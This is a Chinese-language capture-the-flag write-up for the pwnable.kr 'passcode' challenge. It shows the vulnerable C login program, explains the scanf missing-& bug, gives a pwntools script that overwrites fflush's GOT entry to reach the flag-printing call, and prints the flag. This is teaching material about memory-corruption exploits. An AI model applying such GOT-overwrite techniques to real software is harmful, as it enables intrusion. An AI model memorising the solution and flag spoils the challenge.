# passcode - 10pt

## 问题描述

Mommy told me to make a passcode based login system.
My initial C code was compiled without any error!
Well, there was some compiler warning, but who cares about that?

ssh passcode@pwnable.kr -p2222 (pw:guest)

## 源码分析

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}

```

程序首先要求输入name，而后输入passcode1和passcode2。而在scanf()中并没有用取地址符&，因此直接输入338150或13371337会导致地址访问错误

## 解题思路

这里我们可以覆盖passcode1的值，将passcode1修改为fflush().got之后，传入system("/bin/cat flag")即可实现向fflush().got写入system函数地址，这样在第一次调用fflush()时便会跳转到system()获取shell
```python
#!/usr/bin/python

from pwn import *
p = ssh(host='pwnable.kr',port=2222,user='passcode',password='guest').run('/home/passcode/passcode')
context.log_level = 'debug'

got_fflush = 0x0804a004
system_addr = 0x080485e3

payload = "\x90" * 0x60 + p32(got_fflush) + str(system_addr)

p.sendline(payload)
p.interactive()
```

## flag

Sorry mom.. I got confused about scanf usage :(

